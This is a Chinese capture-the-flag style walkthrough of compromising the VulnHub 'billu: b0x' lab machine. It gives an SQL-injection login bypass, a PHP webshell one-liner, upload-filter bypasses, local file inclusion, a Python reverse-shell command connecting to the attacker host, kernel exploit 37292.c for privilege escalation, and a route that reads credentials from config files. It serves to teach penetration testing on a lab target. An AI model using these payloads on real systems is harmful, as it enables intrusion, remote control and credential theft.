# 相关信息

---

kali：10.0.0.9/24

靶机：10.0.0.20/24

靶机介绍：[[billu: b0x ~ VulnHub](https://www.vulnhub.com/entry/billu-b0x,188/)](https://www.vulnhub.com/entry/tre-1,483/)

靶机下载：https://download.vulnhub.com/billu/Billu_b0x.zip

目标：`root`权限

难度：中(两种渗透思路)

==注意：这个靶机在导入时需要勾选下面这个选项，否者无法正常发现主机。该选项表示保留靶机原来的MAC地址，不进行改变。==

<img src="https://image.cchl.fun/kali_image/Snipaste_2023-07-09_15-57-51.png" alt="Snipaste_2023-07-09_15-57-51" style="zoom:50%;" />

# 文字思路

---

## 全流程思路：

-    主机发现	端口扫描	
-    信息搜集：`web`路径爬取非常重要	
-    sql注入（`sqlmap`跑不出来）：非常看运气，不然很难发现。同时也然我们看到非常规的`sql`注入测试。
-    文件包含	文件上传	
-    代码审计：解释了`sql`注入的原因
-    内核漏洞：使用的这个脚本非常常用
-    文件下载：通过这个漏洞实现代码审计和敏感配置文件的读取
-    密码复用

## 下意识的操作

1. 在`web`应用中的`phpmyadmin`的主目录中有个 `config.inc[.php]`的文件，里面包含了非常敏感的一些信息，在渗透测试中需要给予高度的重视。
1. `web`的参数既可以在`url`中以`GET`方法获取，也可以在`web`请求体中以`POST`方法获取。

## 主要的知识点

- 文件包含，下载
- `sql`注入：其中特殊字符非常重要

# 具体流程

---

## 信息搜集

1. 主机发现，端口扫描，版本扫描 。由于使用了脚本可以看出服务的相关`cookie`和相关的`flag`未设置。

   <img src="https://image.cchl.fun/kali_image/Snipaste_2023-07-10_18-14-39.png" alt="Snipaste_2023-07-10_18-14-39" style="zoom:50%;" />

2. 登陆`web80`首页面，发现提示需要进行`sql`注入。

   <img src="https://image.cchl.fun/kali_image/Snipaste_2023-07-10_18-15-25.png" alt="Snipaste_2023-07-10_18-15-25" style="zoom: 50%;" />

   - 万能密码：使用简单的万能密码如：`' or 1=1; --`类似密码是无法进入的。

      <img src="https://image.cchl.fun/kali_image/Snipaste_2023-07-23_17-05-10.png" alt="Snipaste_2023-07-23_17-05-10" style="zoom:50%;" />

   -  `burpsuite`的载荷上传爆破：

      > 将用户名和密码设置为两个变量，选择`Cluster bomb`攻击模式，建议使用`burpsuite`专业版速度才够快。这非常需要足够的幸运，不然进本跑不出来。

      1. 用户名的载荷：`/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt`

      2. 密码载荷：这个使用键盘上的所有特殊字符进行尝试。

3. 通过返回包的长度和渲染出来的网页内容，可以确定`sql`注入的组合为：`or 0=0 #`和`\`。

   <img src="https://image.cchl.fun/kali_image/image-20230724111528808.png" alt="image-20230724111528808" style="zoom:50%;" />


## 文件上传漏洞

1. 键入获取的`sql`注入组合成功的登陆进行后台页面，发现后台有两个用户。

   ![Snipaste_2023-07-23_16-52-25](https://image.cchl.fun/kali_image/Snipaste_2023-07-23_16-52-25.png)

   进一步浏览网页功能发现一个可以进行图片上传的地方，尝试进行`PHP`一句话木马上传并不成功，发现目标服务器是存在文件过滤的。（==一句话木马：<?php system($_GET['cmd']);?>==）

   ![Snipaste_2023-07-23_19-30-42](https://image.cchl.fun/kali_image/Snipaste_2023-07-23_19-30-42.png)

   ![Snipaste_2023-07-23_16-56-23](https://image.cchl.fun/kali_image/Snipaste_2023-07-23_16-56-23.png)

2. 使用`burpsuite`抓包，进行文件上传的绕过，可以轻松的发现靶机对上传文件进行了：==文件后缀，MIME Types，文件头==，这三种过滤方式。对应的进行绕过就好，需要注意`png`的文件头是：`GIF89a;`。

   ![Snipaste_2023-07-23_17-13-20](https://image.cchl.fun/kali_image/Snipaste_2023-07-23_17-13-20.png)

   可以发现上传的图片显示在用户页上，只不过无法加载，点击上传图片的连接获得它在靶机上保存的==相对位置==：`/uploaded_images/payload.png`。

   <img src="https://image.cchl.fun/kali_image/Snipaste_2023-07-23_20-03-19.png" alt="Snipaste_2023-07-23_20-03-19" style="zoom:50%;" />

   ![image-20230723200742414](https://image.cchl.fun/kali_image/image-20230723200742414.png)

## 文件包含/突破边界

> 虽然恶意图片成功上传，但是其是以 `.png`为结尾进行上传的，里面的恶意`PHP`代码是无法被`PHP`成功解析的。所以进一步进行寻找文件==包含==漏洞就显得额外重要。

1. 各种方法已经试过，如源码读取，参数猜解都没有很好的思路，就差路径爬取了。键入下列命令：`dirsearch -u http://10.0.0.20  `，重点关注`add.php`文件。

   <img src="https://image.cchl.fun/kali_image/Snipaste_2023-07-23_19-38-48.png" alt="Snipaste_2023-07-23_19-38-48" style="zoom:50%;" />

2. 经过访问后`add.php`和`add`是同一个文件，它们的页面非常非常的熟悉，就是刚刚文件上传漏洞时使用的`add`功能有一样的排版。所以可以大胆的猜测后台实现图片添加这个功能时，其实是对这个`add.php`文件进行的调用。

   ==注意：更为关键的是对add.php文件包含后，将其解析为php文件。==

   通过对后台上传图片页面的抓包也可以看出来，有个参数`load`就是`add`。

   <img src="https://image.cchl.fun/kali_image/Snipaste_2023-07-23_19-55-47.png" alt="Snipaste_2023-07-23_19-55-47" style="zoom:67%;" />

3. 既然后台的`add`功能是通过文件包含来实现的，是否能让其包含指定的任何文件？测试发现居然可以包含 `/etc/passwd`本地文件。

   ![Snipaste_2023-07-23_19-57-50](https://image.cchl.fun/kali_image/Snipaste_2023-07-23_19-57-50.png)

   那么让其包含上传的恶意`png`文件，它是否也会将其解析为`PHP`？同时取得上传的`cmd`参数为 `which nc`的`url`编码， 可以发现成功的进行了执行，还确定了靶机上存在`nc`。

   > 比较奇怪的是恶意代码为`$_GET`方式接收`cmd`参数，而我们请求的方式为`post`，却依然可以使用`url`传参的方式进行参数传递，不知道为什么。所以最好恶意代码用 `$_REQUEST`方法来接收参数。

   <img src="https://image.cchl.fun/kali_image/image-20230723202444225.png" alt="image-20230723202444225" style="zoom:50%;" />

4. 但是使用`nc`发现一直无法成的进行回连到`4422`端口，使用`python`才成功进行反弹，记得对下面`payload`进行`url`编码。

   ```python
   python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.9",4422));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
   ```


## 提权

1. 当查看到靶机的内核版本时，不难发现其版本较低。

   ![image-20230723203954866](https://image.cchl.fun/kali_image/image-20230723203954866.png)

2. 在漏洞库中进行相关参数的搜索，一个经常使用的C语言脚本`37292.c`，只需要在靶机上编译后执行即可。(==在本系列的第一台靶机上就用过该脚本==)

   ![image-20230723204711487](https://image.cchl.fun/kali_image/image-20230723204711487.png)

3. 通过`python`开启的 `http`网页服务，让靶机获取该C语言脚本，然后进行编译，再赋予执行权限进行执行发现成功进行提权。

   <img src="https://image.cchl.fun/kali_image/image-20230723205213674.png" alt="image-20230723205213674" style="zoom: 50%;" />

# 相关payload

---

### python反弹shell

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.9",4422));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

# 复盘/相关知识

---

## 复盘

> 另一种提权思路，是通过==文件下载==漏洞获取敏感信息进行密码复用，而非上面的==文件包含==漏洞来实现突破边界。
>
> 注意文件包含和文件下载漏洞的区别

1. 对`web`路劲爬取的进一步查看，发现几个非常具有特点的文件路劲。

   <img src="https://image.cchl.fun/kali_image/Snipaste_2023-07-23_19-38-48.png" alt="Snipaste_2023-07-23_19-38-48" style="zoom:67%;" />

   - `test[.php]`：访问后直接提示有个 `file`参数，可以大胆猜测其赋值可以为一个文件路径。

      ![image-20230723212544767](https://image.cchl.fun/kali_image/image-20230723212544767.png)

      但是在用它原本的请求方式`GET`来添加参数时是无法成功的。

      ![image-20230724105245592](https://image.cchl.fun/kali_image/image-20230724105245592.png)

      当修改请求方式为`POST`时再添加参数就可以发现成功的包含`index.php`文件，这个漏洞与文件包含漏洞是不同的，本质上是文件下载漏洞，需要注意一下几点确保文件下载成功：

      - [ ] 需要右键选择更改`burpsuite`的请求方式为`post`，然后来进行`file`参数的添加。
      - [ ] `file`参数必须有个空行和`post`请求头分割开来，同时参数行后面不能有空行。

   - `index.php`：通过`test.php`对其进行下载，再白盒审计，可以解释 `or 1=1 #`和 `\`为什么能够绕过登陆验证。

      ![image-20230724110511411](https://image.cchl.fun/kali_image/image-20230724110511411.png)

      ```php
      $run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';	
      # 原语句
      
      $run='select * from auth where  pass=''.$pass.'' and uname=''.$uname.''';	
      # \转译\'的意思,去掉\
      
      $run='select * from auth where  pass='pass' and uname='uname'';		
      # 结合php引用参数的方式，进一步精简
      
      $run='select * from auth where  pass='\' and uname='or 0=0 #'';		
      # 带入恶意参数后
      
      $run='select * from auth where  pass='' and uname='or 0=0
      # 由于\转移'还是'，#在PHP中表示单行注释，所以生效的sql语句是select * from auth where  pass='' and uname=，	后面的or 0=0是另外的恒真的逻辑判断进而导致：mysqli_num_rows($result) > 0这个登陆判断为真，然后完成登陆的绕过。
      ```

   - `c.php`：下载后可以发现数据库的登陆用户和密码：`billu  :  b0x_billu`

      ![image-20230724110431373](https://image.cchl.fun/kali_image/image-20230724110431373.png)

   - `phpmy`：非常像`phpmyadmin`这个`web`应用的文件目录，不妨进行访问。发现其正是`PHPmyadmin`的后台登陆页面，使用`billu : b0x_billu`可以成功的登陆到后台，并没有是太大的漏洞，看看就行。（==注意进入后台获取密码后进行复用尝试==）

      <img src="https://image.cchl.fun/kali_image/image-20230724113445837.png" alt="image-20230724113445837" style="zoom:50%;" />

      在对这个文件目录进行迭代爬取，发现非常关键的两个配置文件`config.inc.php`。

      <img src="https://image.cchl.fun/kali_image/Snipaste_2023-07-23_19-40-18.png" alt="Snipaste_2023-07-23_19-40-18" style="zoom: 50%;" />

      使用文件下载漏洞后可以查看配置内容，发现一个非常敏感的用户和他的登陆密码：`root:roottoor`

      ![image-20230724113929604](https://image.cchl.fun/kali_image/image-20230724113929604.png)

2. 尝试进行`ssh`登陆，竟然成功以`root`身份登陆，以这种方式完成打靶。

   <img src="https://image.cchl.fun/kali_image/image-20230724114122084.png" alt="image-20230724114122084" style="zoom:50%;" />
